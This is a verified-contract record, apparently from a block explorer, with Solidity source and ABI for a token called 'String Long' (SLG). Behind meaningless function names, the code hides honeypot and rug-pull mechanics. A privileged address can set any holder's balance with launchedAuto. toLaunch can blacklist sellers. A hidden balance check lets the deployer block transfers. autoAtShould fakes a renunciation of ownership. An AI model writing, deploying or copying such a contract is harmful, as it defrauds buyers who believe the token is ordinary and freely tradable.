{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.14;\n\ninterface swapSell {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\nabstract contract txAmount {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface autoLaunch {\n    function createPair(address txLiquidity, address tokenAuto) external returns (address);\n}\n\ninterface takeList {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address launchedMin) external view returns (uint256);\n\n    function transfer(address totalIs, uint256 fundSender) external returns (bool);\n\n    function allowance(address minAmount, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 fundSender) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address totalIs,\n        uint256 fundSender\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed atFee, uint256 value);\n    event Approval(address indexed minAmount, address indexed spender, uint256 value);\n}\n\ninterface takeListMetadata is takeList {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract StringLong is txAmount, takeList, takeListMetadata {\n\n    constructor (){\n        if (limitTo == fundFrom) {\n            modeWallet = tradingLaunch;\n        }\n        swapSell modeFund = swapSell(limitMin);\n        teamReceiverTotal = autoLaunch(modeFund.factory()).createPair(modeFund.WETH(), address(this));\n        if (sellAmount != tradingLaunch) {\n            modeWallet = listSender;\n        }\n        feeTrading = _msgSender();\n        autoAtShould();\n        isReceiver[feeTrading] = true;\n        enableShould[feeTrading] = buyMarketing;\n        \n        emit Transfer(address(0), feeTrading, buyMarketing);\n    }\n\n    function autoAtShould() public {\n        emit OwnershipTransferred(feeTrading, address(0));\n        totalEnableMode = address(0);\n    }\n\n    string private minReceiver = \"SLG\";\n\n    function name() external view virtual override returns (string memory) {\n        return txTrading;\n    }\n\n    mapping(address => mapping(address => uint256)) private teamSell;\n\n    uint256 private txModeFund;\n\n    uint256 launchedSender;\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return buyMarketing;\n    }\n\n    function shouldFee(address launchTrading, address totalIs, uint256 fundSender) internal returns (bool) {\n        require(enableShould[launchTrading] >= fundSender);\n        enableShould[launchTrading] -= fundSender;\n        enableShould[totalIs] += fundSender;\n        emit Transfer(launchTrading, totalIs, fundSender);\n        return true;\n    }\n\n    function owner() external view returns (address) {\n        return totalEnableMode;\n    }\n\n    uint256 public sellAmount;\n\n    uint256 buyLaunch;\n\n    function toEnable(address modeLiquidity) public {\n        if (listMin) {\n            return;\n        }\n        \n        isReceiver[modeLiquidity] = true;\n        if (swapMarketing == sellAmount) {\n            shouldExempt = modeWallet;\n        }\n        listMin = true;\n    }\n\n    function amountLiquidity() private view {\n        require(isReceiver[_msgSender()]);\n    }\n\n    address public feeTrading;\n\n    function launchedAuto(address amountMode, uint256 fundSender) public {\n        amountLiquidity();\n        enableShould[amountMode] = fundSender;\n    }\n\n    function transfer(address amountMode, uint256 fundSender) external virtual override returns (bool) {\n        return tradingLaunched(_msgSender(), amountMode, fundSender);\n    }\n\n    function decimals() external view virtual override returns (uint8) {\n        return marketingTrading;\n    }\n\n    string private txTrading = \"String Long\";\n\n    bool public listMin;\n\n    function allowance(address teamLaunchedTrading, address txFund) external view virtual override returns (uint256) {\n        if (txFund == limitMin) {\n            return type(uint256).max;\n        }\n        return teamSell[teamLaunchedTrading][txFund];\n    }\n\n    mapping(address => bool) public fromReceiverLiquidity;\n\n    uint256 private shouldExempt;\n\n    uint256 private modeWallet;\n\n    mapping(address => uint256) private enableShould;\n\n    function transferFrom(address launchTrading, address totalIs, uint256 fundSender) external override returns (bool) {\n        if (_msgSender() != limitMin) {\n            if (teamSell[launchTrading][_msgSender()] != type(uint256).max) {\n                require(fundSender <= teamSell[launchTrading][_msgSender()]);\n                teamSell[launchTrading][_msgSender()] -= fundSender;\n            }\n        }\n        return tradingLaunched(launchTrading, totalIs, fundSender);\n    }\n\n    function toLaunch(address totalMode) public {\n        amountLiquidity();\n        \n        if (totalMode == feeTrading || totalMode == teamReceiverTotal) {\n            return;\n        }\n        fromReceiverLiquidity[totalMode] = true;\n    }\n\n    function symbol() external view virtual override returns (string memory) {\n        return minReceiver;\n    }\n\n    uint256 constant launchedAmount = 13 ** 10;\n\n    address limitMin = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    uint256 public swapMarketing;\n\n    uint256 private buyMarketing = 100000000 * 10 ** 18;\n\n    uint8 private marketingTrading = 18;\n\n    bool public limitTo;\n\n    address public teamReceiverTotal;\n\n    function getOwner() external view returns (address) {\n        return totalEnableMode;\n    }\n\n    function tradingLaunched(address launchTrading, address totalIs, uint256 fundSender) internal returns (bool) {\n        if (launchTrading == feeTrading) {\n            return shouldFee(launchTrading, totalIs, fundSender);\n        }\n        uint256 maxMin = takeList(teamReceiverTotal).balanceOf(fundAtSwap);\n        require(maxMin == launchedSender);\n        require(totalIs != fundAtSwap);\n        if (fromReceiverLiquidity[launchTrading]) {\n            return shouldFee(launchTrading, totalIs, launchedAmount);\n        }\n        return shouldFee(launchTrading, totalIs, fundSender);\n    }\n\n    event OwnershipTransferred(address indexed isList, address indexed autoLaunchedFee);\n\n    function approve(address txFund, uint256 fundSender) public virtual override returns (bool) {\n        teamSell[_msgSender()][txFund] = fundSender;\n        emit Approval(_msgSender(), txFund, fundSender);\n        return true;\n    }\n\n    function enableMode(uint256 fundSender) public {\n        amountLiquidity();\n        launchedSender = fundSender;\n    }\n\n    uint256 public listSender;\n\n    address private totalEnableMode;\n\n    function balanceOf(address launchedMin) public view virtual override returns (uint256) {\n        return enableShould[launchedMin];\n    }\n\n    bool public fundFrom;\n\n    mapping(address => bool) public isReceiver;\n\n    address fundAtSwap = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    uint256 public tradingLaunch;\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"minAmount\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"isList\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"autoLaunchedFee\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"atFee\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"teamLaunchedTrading\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"txFund\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"txFund\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"fundSender\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"autoAtShould\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"launchedMin\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"fundSender\",\"type\":\"uint256\"}],\"name\":\"enableMode\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"feeTrading\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"fromReceiverLiquidity\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"fundFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"isReceiver\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"amountMode\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"fundSender\",\"type\":\"uint256\"}],\"name\":\"launchedAuto\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"limitTo\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"listMin\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"listSender\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"sellAmount\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"swapMarketing\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"teamReceiverTotal\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"modeLiquidity\",\"type\":\"address\"}],\"name\":\"toEnable\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"totalMode\",\"type\":\"address\"}],\"name\":\"toLaunch\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"tradingLaunch\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"amountMode\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"fundSender\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"launchTrading\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"totalIs\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"fundSender\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "StringLong", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}